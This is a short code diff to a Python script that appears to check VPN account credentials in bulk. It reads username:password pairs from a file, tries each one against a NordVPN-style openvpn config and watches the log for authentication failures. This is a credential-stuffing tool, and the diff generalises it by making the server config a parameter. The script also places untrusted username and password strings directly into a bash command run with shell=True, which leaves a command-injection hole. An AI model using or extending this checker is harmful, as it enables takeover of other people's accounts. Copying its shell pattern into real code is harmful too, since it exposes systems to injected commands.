@@ -1,7 +1,9 @@
 import os
 import os.path
+import subprocess
 import time
 from argparse import ArgumentParser
+
 from termcolor import colored
 
 
@@ -17,11 +19,12 @@ def main(**kwargs):
         content = file.read()
         for user_pass in content.split("\n"):
             uname, pswd = user_pass.split(":", 1)
-            os.system(
-                "openvpn --config us8245.nordvpn.com.udp.ovpn "
+            subprocess.Popen(
+                f"openvpn --config {kwargs['config']} "
                 "--route-noexec "
                 f'--auth-user-pass <(echo -e "{uname}\n{pswd}") '
-                "--log ovpn.log --daemon"
+                "--log ovpn.log --daemon",
+                shell=True, executable="/bin/bash"
             )
             time.sleep(5)
             if "AUTH_FAILED" in open("ovpn.log").read():
